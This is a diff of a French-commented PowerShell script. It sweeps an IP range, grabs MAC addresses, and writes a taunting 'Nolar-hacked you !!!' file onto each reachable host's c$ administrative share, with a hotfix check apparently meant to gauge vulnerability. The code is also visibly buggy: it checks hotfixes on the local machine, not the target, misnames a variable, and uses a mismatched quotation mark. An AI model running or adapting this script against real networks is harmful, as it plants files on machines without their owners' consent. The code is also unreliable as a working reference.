@@ -25,29 +25,35 @@ foreach ($r in $range){
 # On test les IPs UP
 #-------------------------------------------------------------------
 
-    If (Test-Connection -BufferSize 32 -ComputerName $ip -count 1 -quiet) {
-   $socket = new-object System.Net.Sockets.TcpClient($ip, $port)
+    If (Test-Connection -BufferSize 32 -ComputerName $ip -count 2 -quiet) {
+    $socket = new-object System.Net.Sockets.TcpClient($ip, $port)
 
+            #Permet de recuprer l'adresse Mac
+            $macadress = Get-NetNeighbor -AddressFamily IPv4 | where {$_.IPAddress -like $ip} | select -Property LinkLayerAddress | select -ExpandProperty LinkLayerAddress
+
+            ""
+            "---------------------------------------------------------"
+            "----------|$ip -- $macadress|----------"
+            "---------------------------------------------------------"
+        
 #-------------------------------------------------------------------
 # On essaye de se connecter en smb sur la machine puis on transfert
 #-------------------------------------------------------------------
 
         if($socket.Connected){
             $transfered = New-Item -Path "\\$ip\c$" -ItemType file -Name Trolololo.jpg -Value "Nolar-hacked you !!!"
-   
+
             #checks the computer it's run on if any of the listed hotfixes are present
             $hotfix = Get-HotFix -ComputerName $env:computername | Where-Object {$hotfixes -contains $_.HotfixID} | Select-Object -property "HotFixID"
             ""
-            "---------------------------------------------------------"
-            "$IP"
-            "---------------------------------------------------------"
+
             #confirms whether hotfix is found or not
             if (Get-HotFix | Where-Object {$hotfixes -contains $_.HotfixID})
-                {$foud = Write-Host "Found HotFix: " + $hotfix.HotFixID + "for $IP" -ForegroundColor Red
+                {$foud = Write-Host "Found HotFix: " + $hotfix.HotFixID + "for $ip" -ForegroundColor Red
                 $found
                 }
             else 
-                {$notfound = Write-Host ”Didn't Find HotFix for $IP" -ForegroundColor Green
+                {$notfound = Write-Host ”Didn't Find HotFix for $ip" -ForegroundColor Green
                 $notfound
                 }
 
@@ -57,12 +63,12 @@ foreach ($r in $range){
 
                 if ($transfered.Exists){
                     ""
-                    Write-Host "Port Open and File has been Transfered on $IP" -ForegroundColor Green
+                    Write-Host "Port Open and File has been Transfered on $ip" -ForegroundColor Green
                     "---------------------------------------------------------"
                 }
                 Else {
                     ""
-                    Write-Host "Port Open but Error on Identification for $IP" -ForegroundColor Red
+                    Write-Host "Port Open but Error on Identification for $ip" -ForegroundColor Red
                     "---------------------------------------------------------"
                 }  
         }
